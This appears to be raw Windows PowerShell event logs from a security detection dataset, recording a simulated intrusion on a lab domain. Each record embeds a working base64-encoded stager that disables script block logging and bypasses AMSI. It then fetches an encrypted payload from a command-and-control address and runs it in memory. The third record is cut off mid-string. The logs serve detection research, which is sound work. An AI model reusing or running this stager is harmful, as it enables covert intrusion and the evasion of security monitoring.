{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-B024-2D856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":5092,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:22:42","@timestamp":"2020-09-22T08:22:44.301Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":213880,"Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$097c.Headers.Add($_.Name, $_.Value)\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 4c21984a-34d8-4d8e-8cf3-8ec0ea4212e8\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 14fec114-9ecd-42a9-9fe7-148387e88b78\r\n        Pipeline ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 28365\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-B124-2D856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":5092,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:22:42","@timestamp":"2020-09-22T08:22:44.301Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":213881,"Payload":"CommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 4c21984a-34d8-4d8e-8cf3-8ec0ea4212e8\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 14fec114-9ecd-42a9-9fe7-148387e88b78\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 28369\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-5225-2D856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":8112,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:44.302Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":213882,"Payload":"CommandInvocation(Add-Type): \"Add-Type\"\r\nParameterBinding(Add-Type): name=\"TypeDefinition\"; value=\"using System;\nusing System.Runtime.InteropServices;\npublic static class priv\n{\n    [DllImport(\"shell32.dll\")]\n    public static extern bool IsUserAnAdmin();\n}\"\r\nParameterBinding(Add-Type): name=\"Language\"; value=\"CSharp\"\r\nParameterBinding(Add-Type): name=\"PassThru\"; value=\"True\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcA